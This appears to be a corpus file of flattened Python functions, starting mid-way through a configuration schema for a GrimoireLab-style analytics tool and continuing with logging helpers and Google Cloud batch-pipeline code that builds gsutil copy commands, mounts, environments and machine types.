} , "kibiter_url" : { "optional" : False , "default" : None , "type" : str , "description" : "Kibiter URL" } , "kibiter_version" : { "optional" : True , "default" : None , "type" : str , "description" : "Kibiter version" } , "community" : { "optional" : True , "default" : True , "type" : bool , "description" : "Enable community structure menu" } , "kafka" : { "optional" : True , "default" : False , "type" : bool , "description" : "Enable kafka menu" } , "github-repos" : { "optional" : True , "default" : False , "type" : bool , "description" : "Enable GitHub repo stats menu" } , "gitlab-issues" : { "optional" : True , "default" : False , "type" : bool , "description" : "Enable GitLab issues menu" } , "gitlab-merges" : { "optional" : True , "default" : False , "type" : bool , "description" : "Enable GitLab merge requests menu" } , "mattermost" : { "optional" : True , "default" : False , "type" : bool , "description" : "Enable Mattermost menu" } } } params_report = { "report" : { "start_date" : { "optional" : False , "default" : "1970-01-01" , "type" : str , "description" : "Start date for the report" } , "end_date" : { "optional" : False , "default" : "2100-01-01" , "type" : str , "description" : "End date for the report" } , "interval" : { "optional" : False , "default" : "quarter" , "type" : str , "description" : "Interval for the report" } , "config_file" : { "optional" : False , "default" : "report.cfg" , "type" : str , "description" : "Config file for the report" } , "data_dir" : { "optional" : False , "default" : "report_data" , "type" : str , "description" : "Directory in which to store the report data" } , "filters" : { "optional" : True , "default" : [ ] , "type" : list , "description" : "General filters to be applied to all queries" } , "offset" : { "optional" : True , "default" : None , "type" : str , "description" : "Date offset to be applied to start and end" } } } params_sortinghat = { "sortinghat" : { "affiliate" : { "optional" : False , "default" : "True" , "type" : bool , "description" : "Affiliate identities to organizations" } , "unaffiliated_group" : { "optional" : False , "default" : "Unknown" , "type" : str , "description" : "Name of the organization for unaffiliated identities" } , "matching" : { "optional" : False , "default" : [ "email" ] , "type" : list , "description" : "Algorithm for matching identities in Sortinghat" } , "sleep_for" : { "optional" : False , "default" : 3600 , "type" : int , "description" : "Delay between task identities executions" } , "database" : { "optional" : False , "default" : "sortinghat_db" , "type" : str , "description" : "Name of the Sortinghat database" } , "host" : { "optional" : False , "default" : "mariadb" , "type" : str , "description" : "Host with the Sortinghat database" } , "user" : { "optional" : False , "default" : "root" , "type" : str , "description" : "User to access the Sortinghat database" } , "password" : { "optional" : False , "default" : "" , "type" : str , "description" : "Password to access the Sortinghat database" } , "autoprofile" : { "optional" : False , "default" : [ "customer" , "git" , "github" ] , "type" : list , "description" : "Order in which to get the identities information for filling the profile" } , "load_orgs" : { "optional" : True , "default" : False , "type" : bool , "deprecated" : "Load organizations in Sortinghat database" , "description" : "" } , "identities_format" : { "optional" : True , "default" : "sortinghat" , "type" : str , "description" : "Format of the identities data to be loaded" } , "strict_mapping" : { "optional" : True , "default" : True , "type" : bool , "description" : "rigorous check of values in identities matching " "(i.e, well formed email addresses)" } , "reset_on_load" : { "optional" : True , "default" : False , "type" : bool , "description" : "Unmerge and remove affiliations for all identities on load" } , "orgs_file" : { "optional" : True , "default" : None , "type" : str , "description" : "File path with the organizations to be loaded in Sortinghat" } , "identities_file" : { "optional" : True , "default" : [ ] , "type" : list , "description" : "File path with the identities to be loaded in Sortinghat" } , "identities_export_url" : { "optional" : True , "default" : None , "type" : str , "description" : "URL in which to export the identities in Sortinghat" } , "identities_api_token" : { "optional" : True , "default" : None , "type" : str , "description" : "API token for remote operation with GitHub and Gitlab" } , "bots_names" : { "optional" : True , "default" : [ ] , "type" : list , "description" : "Name of the identities to be marked as bots" } , "no_bots_names" : { "optional" : True , "default" : [ ] , "type" : list , "description" : "Name of the identities to be unmarked as bots" } , "autogender" : { "optional" : True , "default" : False , "type" : bool , "description" : "Add gender to the profiles (executes autogender)" } } } params_track_items = { "track_items" : { "project" : { "optional" : False , "default" : "TrackProject" , "type" : str , "description" : "Gerrit project to track" } , "upstream_raw_es_url" : { "optional" : False , "default" : "" , "type" : str , "description" : "URL with the file with the gerrit reviews to track" } , "raw_index_gerrit" : { "optional" : False , "default" : "" , "type" : str , "description" : "Name of the gerrit raw index" } , "raw_index_git" : { "optional" : False , "default" : "" , "type" : str , "description" : "Name of the git raw index" } } } tasks_config_params = [ params_collection , params_enrichment , params_panels , params_report , params_sortinghat , params_track_items ] for section_params in tasks_config_params : params . update ( section_params ) return params
def set_param ( self , section , param , value ) : if section not in self . conf or param not in self . conf [ section ] : logger . error ( 'Config section %s and param %s not exists' , section , param ) else : self . conf [ section ] [ param ] = value
def execute_nonstop_tasks ( self , tasks_cls ) : self . execute_batch_tasks ( tasks_cls , self . conf [ 'sortinghat' ] [ 'sleep_for' ] , self . conf [ 'general' ] [ 'min_update_delay' ] , False )
def __execute_initial_load ( self ) : if self . conf [ 'phases' ] [ 'panels' ] : tasks_cls = [ TaskPanels , TaskPanelsMenu ] self . execute_tasks ( tasks_cls ) if self . conf [ 'phases' ] [ 'identities' ] : tasks_cls = [ TaskInitSortingHat ] self . execute_tasks ( tasks_cls ) logger . info ( "Loading projects" ) tasks_cls = [ TaskProjects ] self . execute_tasks ( tasks_cls ) logger . info ( "Done" ) return
def stdout ( self ) : if self . _streaming : stdout = [ ] while not self . __stdout . empty ( ) : try : line = self . __stdout . get_nowait ( ) stdout . append ( line ) except : pass else : stdout = self . __stdout return stdout
def stderr ( self ) : if self . _streaming : stderr = [ ] while not self . __stderr . empty ( ) : try : line = self . __stderr . get_nowait ( ) stderr . append ( line ) except : pass else : stderr = self . __stderr return stderr
def format ( self , record ) : if isinstance ( self . fmt , dict ) : self . _fmt = self . fmt [ record . levelname ] if sys . version_info > ( 3 , 2 ) : # Update self._style because we've changed self._fmt # (code based on stdlib's logging.Formatter.__init__()) if self . style not in logging . _STYLES : raise ValueError ( 'Style must be one of: %s' % ',' . join ( list ( logging . _STYLES . keys ( ) ) ) ) self . _style = logging . _STYLES [ self . style ] [ 0 ] ( self . _fmt ) if sys . version_info > ( 2 , 7 ) : message = super ( LevelFormatter , self ) . format ( record ) else : message = ColoredFormatter . format ( self , record ) return message
def _get_storage_service ( credentials ) : if credentials is None : credentials = oauth2client . client . GoogleCredentials . get_application_default ( ) return discovery . build ( 'storage' , 'v1' , credentials = credentials )
def _retry_storage_check ( exception ) : now = datetime . now ( ) . strftime ( '%Y-%m-%d %H:%M:%S.%f' ) print_error ( '%s: Exception %s: %s' % ( now , type ( exception ) . __name__ , str ( exception ) ) ) return isinstance ( exception , oauth2client . client . AccessTokenRefreshError )
def outputs_are_present ( outputs ) : # outputs are OutputFileParam (see param_util.py) # If outputs contain a pattern, then there is no way for `dsub` to verify # that *all* output is present. The best that `dsub` can do is to verify # that *some* output was created for each such parameter. for o in outputs : if not o . value : continue if o . recursive : if not folder_exists ( o . value ) : return False else : if not simple_pattern_exists_in_gcs ( o . value ) : return False return True
def _build_pipeline_input_file_param ( cls , var_name , docker_path ) : # If the filename contains a wildcard, then the target Docker path must # be a directory in order to ensure consistency whether the source pattern # contains 1 or multiple files. # # In that case, we set the docker_path to explicitly have a trailing slash # (for the Pipelines API "gsutil cp" handling, and then override the # associated var_name environment variable in the generated Docker command. path , filename = os . path . split ( docker_path ) if '*' in filename : return cls . _build_pipeline_file_param ( var_name , path + '/' ) else : return cls . _build_pipeline_file_param ( var_name , docker_path )
def _build_pipeline_docker_command ( cls , script_name , inputs , outputs , envs ) : # We upload the user script as an environment argument # and write it to SCRIPT_DIR (preserving its local file name). # # The docker_command: # * writes the script body to a file # * installs gcloud if there are recursive copies to do # * sets environment variables for inputs with wildcards # * sets environment variables for recursive input directories # * recursively copies input directories # * creates output directories # * sets environment variables for recursive output directories # * sets the DATA_ROOT environment variable to /mnt/data # * sets the working directory to ${DATA_ROOT} # * executes the user script # * recursively copies output directories recursive_input_dirs = [ var for var in inputs if var . recursive and var . value ] recursive_output_dirs = [ var for var in outputs if var . recursive and var . value ] install_cloud_sdk = '' if recursive_input_dirs or recursive_output_dirs : install_cloud_sdk = INSTALL_CLOUD_SDK export_input_dirs = '' copy_input_dirs = '' if recursive_input_dirs : export_input_dirs = providers_util . build_recursive_localize_env ( providers_util . DATA_MOUNT_POINT , inputs ) copy_input_dirs = providers_util . build_recursive_localize_command ( providers_util . DATA_MOUNT_POINT , inputs , job_model . P_GCS ) export_output_dirs = '' copy_output_dirs = '' if recursive_output_dirs : export_output_dirs = providers_util . build_recursive_gcs_delocalize_env ( providers_util . DATA_MOUNT_POINT , outputs ) copy_output_dirs = providers_util . build_recursive_delocalize_command ( providers_util . DATA_MOUNT_POINT , outputs , job_model . P_GCS ) docker_paths = [ var . docker_path if var . recursive else os . path . dirname ( var . docker_path ) for var in outputs if var . value ] mkdirs = '\n' . join ( [ 'mkdir -p {0}/{1}' . format ( providers_util . DATA_MOUNT_POINT , path ) for path in docker_paths ] ) inputs_with_wildcards = [ var for var in inputs if not var . recursive and var . docker_path and '*' in os . path . basename ( var . docker_path ) ] export_inputs_with_wildcards = '\n' . join ( [ 'export {0}="{1}/{2}"' . format ( var . name , providers_util . DATA_MOUNT_POINT , var . docker_path ) for var in inputs_with_wildcards ] ) export_empty_envs = '\n' . join ( [ 'export {0}=""' . format ( var . name ) for var in envs | inputs | outputs if not var . value ] ) return DOCKER_COMMAND . format ( mk_runtime_dirs = MK_RUNTIME_DIRS_COMMAND , script_path = '%s/%s' % ( providers_util . SCRIPT_DIR , script_name ) , install_cloud_sdk = install_cloud_sdk , export_inputs_with_wildcards = export_inputs_with_wildcards , export_input_dirs = export_input_dirs , copy_input_dirs = copy_input_dirs , mk_output_dirs = mkdirs , export_output_dirs = export_output_dirs , export_empty_envs = export_empty_envs , tmpdir = providers_util . TMP_DIR , working_dir = providers_util . WORKING_DIR , copy_output_dirs = copy_output_dirs )
def _datetime_to_utc_int ( date ) : if date is None : return None # Convert localized datetime to a UTC integer epoch = dsub_util . replace_timezone ( datetime . utcfromtimestamp ( 0 ) , pytz . utc ) return ( date - epoch ) . total_seconds ( )
def prepare_job_metadata ( self , script , job_name , user_id , create_time ) : return google_base . prepare_job_metadata ( script , job_name , user_id , create_time )
def _build_pipeline_request ( self , task_view ) : job_metadata = task_view . job_metadata job_params = task_view . job_params job_resources = task_view . job_resources task_metadata = task_view . task_descriptors [ 0 ] . task_metadata task_params = task_view . task_descriptors [ 0 ] . task_params task_resources = task_view . task_descriptors [ 0 ] . task_resources script = task_view . job_metadata [ 'script' ] reserved_labels = google_base . build_pipeline_labels ( job_metadata , task_metadata , task_id_pattern = 'task-%d' ) # Build the ephemeralPipeline for this job. # The ephemeralPipeline definition changes for each job because file # parameters localCopy.path changes based on the remote_uri. pipeline = _Pipelines . build_pipeline ( project = self . _project , zones = job_resources . zones , min_cores = job_resources . min_cores , min_ram = job_resources . min_ram , disk_size = job_resources . disk_size , boot_disk_size = job_resources . boot_disk_size , preemptible = job_resources . preemptible , accelerator_type = job_resources . accelerator_type , accelerator_count = job_resources . accelerator_count , image = job_resources . image , script_name = script . name , envs = job_params [ 'envs' ] | task_params [ 'envs' ] , inputs = job_params [ 'inputs' ] | task_params [ 'inputs' ] , outputs = job_params [ 'outputs' ] | task_params [ 'outputs' ] , pipeline_name = job_metadata [ 'pipeline-name' ] ) # Build the pipelineArgs for this job. logging_uri = task_resources . logging_path . uri scopes = job_resources . scopes or google_base . DEFAULT_SCOPES pipeline . update ( _Pipelines . build_pipeline_args ( self . _project , script . value , job_params , task_params , reserved_labels , job_resources . preemptible , logging_uri , scopes , job_resources . keep_alive ) ) return pipeline
def _convert_suffix_to_docker_chars ( suffix ) : # Docker container names must match: [a-zA-Z0-9][a-zA-Z0-9_.-] accepted_characters = string . ascii_letters + string . digits + '_.-' def label_char_transform ( char ) : if char in accepted_characters : return char return '-' return '' . join ( label_char_transform ( c ) for c in suffix )
def _task_sort_function ( task ) : return ( task . get_field ( 'create-time' ) , int ( task . get_field ( 'task-id' , 0 ) ) , int ( task . get_field ( 'task-attempt' , 0 ) ) )
def _datetime_in_range ( self , dt , dt_min = None , dt_max = None ) : # The pipelines API stores operation create-time with second granularity. # We mimic this behavior in the local provider by truncating to seconds. dt = dt . replace ( microsecond = 0 ) if dt_min : dt_min = dt_min . replace ( microsecond = 0 ) else : dt_min = dsub_util . replace_timezone ( datetime . datetime . min , pytz . utc ) if dt_max : dt_max = dt_max . replace ( microsecond = 0 ) else : dt_max = dsub_util . replace_timezone ( datetime . datetime . max , pytz . utc ) return dt_min <= dt <= dt_max
def _get_task_from_task_dir ( self , job_id , user_id , task_id , task_attempt ) : # We need to be very careful about how we read and interpret the contents # of the task directory. The directory could be changing because a new # task is being created. The directory could be changing because a task # is ending. # # If the meta.yaml does not exist, the task does not yet exist. # If the meta.yaml exists, it means the task is scheduled. It does not mean # it is yet running. # If the task.pid file exists, it means that the runner.sh was started. task_dir = self . _task_directory ( job_id , task_id , task_attempt ) job_descriptor = self . _read_task_metadata ( task_dir ) if not job_descriptor : return None # If we read up an old task, the user-id will not be in the job_descriptor. if not job_descriptor . job_metadata . get ( 'user-id' ) : job_descriptor . job_metadata [ 'user-id' ] = user_id # Get the pid of the runner pid = - 1 try : with open ( os . path . join ( task_dir , 'task.pid' ) , 'r' ) as f : pid = int ( f . readline ( ) . strip ( ) ) except ( IOError , OSError ) : pass # Get the script contents script = None script_name = job_descriptor . job_metadata . get ( 'script-name' ) if script_name : script = self . _read_script ( task_dir , script_name ) # Read the files written by the runner.sh. # For new tasks, these may not have been written yet. end_time = self . _get_end_time_from_task_dir ( task_dir ) last_update = self . _get_last_update_time_from_task_dir ( task_dir ) events = self . _get_events_from_task_dir ( task_dir ) status = self . _get_status_from_task_dir ( task_dir ) log_detail = self . _get_log_detail_from_task_dir ( task_dir ) # If the status file is not yet written, then mark the task as pending if not status : status = 'RUNNING' log_detail = [ 'Pending' ] return LocalTask ( task_status = status , events = events , log_detail = log_detail , job_descriptor = job_descriptor , end_time = end_time , last_update = last_update , pid = pid , script = script )
def _task_directory ( self , job_id , task_id , task_attempt ) : dir_name = 'task' if task_id is None else str ( task_id ) if task_attempt : dir_name = '%s.%s' % ( dir_name , task_attempt ) return self . _provider_root ( ) + '/' + job_id + '/' + dir_name
def _make_environment ( self , inputs , outputs , mounts ) : env = { } env . update ( providers_util . get_file_environment_variables ( inputs ) ) env . update ( providers_util . get_file_environment_variables ( outputs ) ) env . update ( providers_util . get_file_environment_variables ( mounts ) ) return env
def _localize_inputs_recursive_command ( self , task_dir , inputs ) : data_dir = os . path . join ( task_dir , _DATA_SUBDIR ) provider_commands = [ providers_util . build_recursive_localize_command ( data_dir , inputs , file_provider ) for file_provider in _SUPPORTED_INPUT_PROVIDERS ] return '\n' . join ( provider_commands )
def _localize_inputs_command ( self , task_dir , inputs , user_project ) : commands = [ ] for i in inputs : if i . recursive or not i . value : continue source_file_path = i . uri local_file_path = task_dir + '/' + _DATA_SUBDIR + '/' + i . docker_path dest_file_path = self . _get_input_target_path ( local_file_path ) commands . append ( 'mkdir -p "%s"' % os . path . dirname ( local_file_path ) ) if i . file_provider in [ job_model . P_LOCAL , job_model . P_GCS ] : # The semantics that we expect here are implemented consistently in # "gsutil cp", and are a bit different than "cp" when it comes to # wildcard handling, so use it for both local and GCS: # # - `cp path/* dest/` will error if "path" has subdirectories. # - `cp "path/*" "dest/"` will fail (it expects wildcard expansion #   to come from shell). if user_project : command = 'gsutil -u %s -mq cp "%s" "%s"' % ( user_project , source_file_path , dest_file_path ) else : command = 'gsutil -mq cp "%s" "%s"' % ( source_file_path , dest_file_path ) commands . append ( command ) return '\n' . join ( commands )
def _delocalize_outputs_commands ( self , task_dir , outputs , user_project ) : commands = [ ] for o in outputs : if o . recursive or not o . value : continue # The destination path is o.uri.path, which is the target directory # (rather than o.uri, which includes the filename or wildcard). dest_path = o . uri . path local_path = task_dir + '/' + _DATA_SUBDIR + '/' + o . docker_path if o . file_provider == job_model . P_LOCAL : commands . append ( 'mkdir -p "%s"' % dest_path ) # Use gsutil even for local files (explained in _localize_inputs_command). if o . file_provider in [ job_model . P_LOCAL , job_model . P_GCS ] : if user_project : command = 'gsutil -u %s -mq cp "%s" "%s"' % ( user_project , local_path , dest_path ) else : command = 'gsutil -mq cp "%s" "%s"' % ( local_path , dest_path ) commands . append ( command ) return '\n' . join ( commands )
def _map ( self , event ) : description = event . get ( 'description' , '' ) start_time = google_base . parse_rfc3339_utc_string ( event . get ( 'timestamp' , '' ) ) for name , regex in _EVENT_REGEX_MAP . items ( ) : match = regex . match ( description ) if match : return { 'name' : name , 'start-time' : start_time } , match return { 'name' : description , 'start-time' : start_time } , None
def _get_logging_env ( self , logging_uri , user_project ) : if not logging_uri . endswith ( '.log' ) : raise ValueError ( 'Logging URI must end in ".log": {}' . format ( logging_uri ) ) logging_prefix = logging_uri [ : - len ( '.log' ) ] return { 'LOGGING_PATH' : '{}.log' . format ( logging_prefix ) , 'STDOUT_PATH' : '{}-stdout.log' . format ( logging_prefix ) , 'STDERR_PATH' : '{}-stderr.log' . format ( logging_prefix ) , 'USER_PROJECT' : user_project , }
def _get_prepare_env ( self , script , job_descriptor , inputs , outputs , mounts ) : # Add the _SCRIPT_REPR with the repr(script) contents # Add the _META_YAML_REPR with the repr(meta) contents # Add variables for directories that need to be created, for example: # DIR_COUNT: 2 # DIR_0: /mnt/data/input/gs/bucket/path1/ # DIR_1: /mnt/data/output/gs/bucket/path2 # List the directories in sorted order so that they are created in that # order. This is primarily to ensure that permissions are set as we create # each directory. # For example: #   mkdir -m 777 -p /root/first/second #   mkdir -m 777 -p /root/first # *may* not actually set 777 on /root/first docker_paths = sorted ( [ var . docker_path if var . recursive else os . path . dirname ( var . docker_path ) for var in inputs | outputs | mounts if var . value ] ) env = { _SCRIPT_VARNAME : repr ( script . value ) , _META_YAML_VARNAME : repr ( job_descriptor . to_yaml ( ) ) , 'DIR_COUNT' : str ( len ( docker_paths ) ) } for idx , path in enumerate ( docker_paths ) : env [ 'DIR_{}' . format ( idx ) ] = os . path . join ( providers_util . DATA_MOUNT_POINT , path ) return env
def _get_localization_env ( self , inputs , user_project ) : # Add variables for paths that need to be localized, for example: # INPUT_COUNT: 1 # INPUT_0: MY_INPUT_FILE # INPUT_RECURSIVE_0: 0 # INPUT_SRC_0: gs://mybucket/mypath/myfile # INPUT_DST_0: /mnt/data/inputs/mybucket/mypath/myfile non_empty_inputs = [ var for var in inputs if var . value ] env = { 'INPUT_COUNT' : str ( len ( non_empty_inputs ) ) } for idx , var in enumerate ( non_empty_inputs ) : env [ 'INPUT_{}' . format ( idx ) ] = var . name env [ 'INPUT_RECURSIVE_{}' . format ( idx ) ] = str ( int ( var . recursive ) ) env [ 'INPUT_SRC_{}' . format ( idx ) ] = var . value # For wildcard paths, the destination must be a directory dst = os . path . join ( providers_util . DATA_MOUNT_POINT , var . docker_path ) path , filename = os . path . split ( dst ) if '*' in filename : dst = '{}/' . format ( path ) env [ 'INPUT_DST_{}' . format ( idx ) ] = dst env [ 'USER_PROJECT' ] = user_project return env
def _get_delocalization_env ( self , outputs , user_project ) : # Add variables for paths that need to be delocalized, for example: # OUTPUT_COUNT: 1 # OUTPUT_0: MY_OUTPUT_FILE # OUTPUT_RECURSIVE_0: 0 # OUTPUT_SRC_0: gs://mybucket/mypath/myfile # OUTPUT_DST_0: /mnt/data/outputs/mybucket/mypath/myfile non_empty_outputs = [ var for var in outputs if var . value ] env = { 'OUTPUT_COUNT' : str ( len ( non_empty_outputs ) ) } for idx , var in enumerate ( non_empty_outputs ) : env [ 'OUTPUT_{}' . format ( idx ) ] = var . name env [ 'OUTPUT_RECURSIVE_{}' . format ( idx ) ] = str ( int ( var . recursive ) ) env [ 'OUTPUT_SRC_{}' . format ( idx ) ] = os . path . join ( providers_util . DATA_MOUNT_POINT , var . docker_path ) # For wildcard paths, the destination must be a directory if '*' in var . uri . basename : dst = var . uri . path else : dst = var . uri env [ 'OUTPUT_DST_{}' . format ( idx ) ] = dst env [ 'USER_PROJECT' ] = user_project return env
def _build_user_environment ( self , envs , inputs , outputs , mounts ) : envs = { env . name : env . value for env in envs } envs . update ( providers_util . get_file_environment_variables ( inputs ) ) envs . update ( providers_util . get_file_environment_variables ( outputs ) ) envs . update ( providers_util . get_file_environment_variables ( mounts ) ) return envs
def _get_mount_actions ( self , mounts , mnt_datadisk ) : actions_to_add = [ ] for mount in mounts : bucket = mount . value [ len ( 'gs://' ) : ] mount_path = mount . docker_path actions_to_add . extend ( [ google_v2_pipelines . build_action ( name = 'mount-{}' . format ( bucket ) , flags = [ 'ENABLE_FUSE' , 'RUN_IN_BACKGROUND' ] , image_uri = _GCSFUSE_IMAGE , mounts = [ mnt_datadisk ] , commands = [ '--implicit-dirs' , '--foreground' , '-o ro' , bucket , os . path . join ( providers_util . DATA_MOUNT_POINT , mount_path ) ] ) , google_v2_pipelines . build_action ( name = 'mount-wait-{}' . format ( bucket ) , flags = [ 'ENABLE_FUSE' ] , image_uri = _GCSFUSE_IMAGE , mounts = [ mnt_datadisk ] , commands = [ 'wait' , os . path . join ( providers_util . DATA_MOUNT_POINT , mount_path ) ] ) ] ) return actions_to_add
def _build_pipeline_request ( self , task_view ) : job_metadata = task_view . job_metadata job_params = task_view . job_params job_resources = task_view . job_resources task_metadata = task_view . task_descriptors [ 0 ] . task_metadata task_params = task_view . task_descriptors [ 0 ] . task_params task_resources = task_view . task_descriptors [ 0 ] . task_resources # Set up VM-specific variables mnt_datadisk = google_v2_pipelines . build_mount ( disk = _DATA_DISK_NAME , path = providers_util . DATA_MOUNT_POINT , read_only = False ) scopes = job_resources . scopes or google_base . DEFAULT_SCOPES # Set up the task labels labels = { label . name : label . value if label . value else '' for label in google_base . build_pipeline_labels ( job_metadata , task_metadata ) | job_params [ 'labels' ] | task_params [ 'labels' ] } # Set local variables for the core pipeline values script = task_view . job_metadata [ 'script' ] user_project = task_view . job_metadata [ 'user-project' ] or '' envs = job_params [ 'envs' ] | task_params [ 'envs' ] inputs = job_params [ 'inputs' ] | task_params [ 'inputs' ] outputs = job_params [ 'outputs' ] | task_params [ 'outputs' ] mounts = job_params [ 'mounts' ] gcs_mounts = param_util . get_gcs_mounts ( mounts ) persistent_disk_mount_params = param_util . get_persistent_disk_mounts ( mounts ) persistent_disks = [ google_v2_pipelines . build_disk ( name = disk . name . replace ( '_' , '-' ) , # Underscores not allowed size_gb = disk . disk_size or job_model . DEFAULT_MOUNTED_DISK_SIZE , source_image = disk . value , disk_type = disk . disk_type or job_model . DEFAULT_DISK_TYPE ) for disk in persistent_disk_mount_params ] persistent_disk_mounts = [ google_v2_pipelines . build_mount ( disk = persistent_disk . get ( 'name' ) , path = os . path . join ( providers_util . DATA_MOUNT_POINT , persistent_disk_mount_param . docker_path ) , read_only = True ) for persistent_disk , persistent_disk_mount_param in zip ( persistent_disks , persistent_disk_mount_params ) ] # The list of "actions" (1-based) will be: #   1- continuous copy of log files off to Cloud Storage #   2- prepare the shared mount point (write the user script) #   3- localize objects from Cloud Storage to block storage #   4- execute user command #   5- delocalize objects from block storage to Cloud Storage #   6- final copy of log files off to Cloud Storage # # If the user has requested an SSH server be started, it will be inserted # after logging is started, and all subsequent action numbers above will be # incremented by 1. # If the user has requested to mount one or more buckets, two actions per # bucket will be inserted after the prepare step, and all subsequent action # numbers will be incremented by the number of actions added. # # We need to track the action numbers specifically for the user action and # the final logging action. optional_actions = 0 if job_resources . ssh : optional_actions += 1 mount_actions = self . _get_mount_actions ( gcs_mounts , mnt_datadisk ) optional_actions += len ( mount_actions ) user_action = 4 + optional_actions final_logging_action = 6 + optional_actions # Set up the commands and environment for the logging actions logging_cmd = _LOGGING_CMD . format ( log_cp_fn = _GSUTIL_CP_FN , log_cp_cmd = _LOG_CP_CMD . format ( user_action = user_action , logging_action = 'logging_action' ) ) continuous_logging_cmd = _CONTINUOUS_LOGGING_CMD . format ( log_msg_fn = _LOG_MSG_FN , log_cp_fn = _GSUTIL_CP_FN , log_cp_cmd = _LOG_CP_CMD . format ( user_action = user_action , logging_action = 'continuous_logging_action' ) , final_logging_action = final_logging_action , log_interval = job_resources . log_interval or '60s' ) logging_env = self . _get_logging_env ( task_resources . logging_path . uri , user_project ) # Set up command and environments for the prepare, localization, user, # and de-localization actions script_path = os . path . join ( providers_util . SCRIPT_DIR , script . name ) prepare_command = _PREPARE_CMD . format ( log_msg_fn = _LOG_MSG_FN , mk_runtime_dirs = _MK_RUNTIME_DIRS_CMD , script_var = _SCRIPT_VARNAME , python_decode_script = _PYTHON_DECODE_SCRIPT , script_path = script_path , mk_io_dirs = _MK_IO_DIRS ) prepare_env = self . _get_prepare_env ( script , task_view , inputs , outputs , mounts ) localization_env = self . _get_localization_env ( inputs , user_project ) user_environment = self . _build_user_environment ( envs , inputs , outputs , mounts ) delocalization_env = self . _get_delocalization_env ( outputs , user_project ) # Build the list of actions actions = [ ] actions . append ( google_v2_pipelines . build_action ( name = 'logging' , flags = 'RUN_IN_BACKGROUND' , image_uri = _CLOUD_SDK_IMAGE , environment = logging_env , entrypoint = '/bin/bash' , commands = [ '-c' , continuous_logging_cmd ] ) ) if job_resources . ssh : actions . append ( google_v2_pipelines . build_action ( name = 'ssh' , image_uri = _SSH_IMAGE , mounts = [ mnt_datadisk ] , entrypoint = 'ssh-server' , port_mappings = { _DEFAULT_SSH_PORT : _DEFAULT_SSH_PORT } , flags = 'RUN_IN_BACKGROUND' ) ) actions . append ( google_v2_pipelines . build_action ( name = 'prepare' , image_uri = _PYTHON_IMAGE , mounts = [ mnt_datadisk ] , environment = prepare_env , entrypoint = '/bin/bash' , commands = [ '-c' , prepare_command ] ) , ) actions . extend ( mount_actions ) actions . extend ( [ google_v2_pipelines . build_action ( name = 'localization' , image_uri = _CLOUD_SDK_IMAGE , mounts = [ mnt_datadisk ] , environment = localization_env , entrypoint = '/bin/bash' , commands = [ '-c' , _LOCALIZATION_CMD . format ( log_msg_fn = _LOG_MSG_FN , recursive_cp_fn = _GSUTIL_RSYNC_FN , cp_fn = _GSUTIL_CP_FN , cp_loop = _LOCALIZATION_LOOP ) ] ) , google_v2_pipelines . build_action ( name = 'user-command' , image_uri = job_resources . image , mounts = [ mnt_datadisk ] + persistent_disk_mounts , environment = user_environment , entrypoint = '/usr/bin/env' , commands = [ 'bash' , '-c' , _USER_CMD . format ( tmp_dir = providers_util . TMP_DIR , working_dir = providers_util . WORKING_DIR , user_script = script_path ) ] ) , google_v2_pipelines . build_action ( name = 'delocalization' , image_uri = _CLOUD_SDK_IMAGE , mounts = [ mnt_datadisk ] , environment = delocalization_env , entrypoint = '/bin/bash' , commands = [ '-c' , _LOCALIZATION_CMD . format ( log_msg_fn = _LOG_MSG_FN , recursive_cp_fn = _GSUTIL_RSYNC_FN , cp_fn = _GSUTIL_CP_FN , cp_loop = _DELOCALIZATION_LOOP ) ] ) , google_v2_pipelines . build_action ( name = 'final_logging' , flags = 'ALWAYS_RUN' , image_uri = _CLOUD_SDK_IMAGE , environment = logging_env , entrypoint = '/bin/bash' , commands = [ '-c' , logging_cmd ] ) , ] ) assert len ( actions ) - 2 == user_action assert len ( actions ) == final_logging_action # Prepare the VM (resources) configuration disks = [ google_v2_pipelines . build_disk ( _DATA_DISK_NAME , job_resources . disk_size , source_image = None , disk_type = job_resources . disk_type or job_model . DEFAULT_DISK_TYPE ) ] disks . extend ( persistent_disks ) network = google_v2_pipelines . build_network ( job_resources . network , job_resources . subnetwork , job_resources . use_private_address ) if job_resources . machine_type : machine_type = job_resources . machine_type elif job_resources . min_cores or job_resources . min_ram : machine_type = GoogleV2CustomMachine . build_machine_type ( job_resources . min_cores , job_resources . min_ram ) else : machine_type = job_model . DEFAULT_MACHINE_TYPE accelerators = None if job_resources . accelerator_type : accelerators = [ google_v2_pipelines . build_accelerator ( job_resources . accelerator_type , job_resources . accelerator_count ) ] service_account = google_v2_pipelines . build_service_account ( job_resources . service_account or 'default' , scopes ) resources = google_v2_pipelines . build_resources ( self . _project , job_resources . regions , google_base . get_zones ( job_resources . zones ) , google_v2_pipelines . build_machine ( network = network , machine_type = machine_type , preemptible = job_resources . preemptible , service_account = service_account , boot_disk_size_gb = job_resources . boot_disk_size , disks = disks , accelerators = accelerators , nvidia_driver_version = job_resources . nvidia_driver_version , labels = labels , cpu_platform = job_resources . cpu_platform ) , ) # Build the pipeline request pipeline = google_v2_pipelines . build_pipeline ( actions , resources , None , job_resources . timeout ) return { 'pipeline' : pipeline , 'labels' : labels }
def _validate_ram ( ram_in_mb ) : return int ( GoogleV2CustomMachine . _MEMORY_MULTIPLE * math . ceil ( ram_in_mb / GoogleV2CustomMachine . _MEMORY_MULTIPLE ) )
def build_machine_type ( cls , min_cores , min_ram ) : min_cores = min_cores or job_model . DEFAULT_MIN_CORES min_ram = min_ram or job_model . DEFAULT_MIN_RAM # First, min_ram is given in GB. Convert to MB. min_ram *= GoogleV2CustomMachine . _MB_PER_GB # Only machine types with 1 vCPU or an even number of vCPUs can be created. cores = cls . _validate_cores ( min_cores ) # The total memory of the instance must be a multiple of 256 MB. ram = cls . _validate_ram ( min_ram ) # Memory must be between 0.9 GB per vCPU, up to 6.5 GB per vCPU. memory_to_cpu_ratio = ram / cores if memory_to_cpu_ratio < GoogleV2CustomMachine . _MIN_MEMORY_PER_CPU : # If we're under the ratio, top up the memory. adjusted_ram = GoogleV2CustomMachine . _MIN_MEMORY_PER_CPU * cores ram = cls . _validate_ram ( adjusted_ram ) elif memory_to_cpu_ratio > GoogleV2CustomMachine . _MAX_MEMORY_PER_CPU : # If we're over the ratio, top up the CPU. adjusted_cores = math . ceil ( ram / GoogleV2CustomMachine . _MAX_MEMORY_PER_CPU ) cores = cls . _validate_cores ( adjusted_cores ) else : # Ratio is within the restrictions - no adjustments needed. pass return 'custom-{}-{}' . format ( int ( cores ) , int ( ram ) )
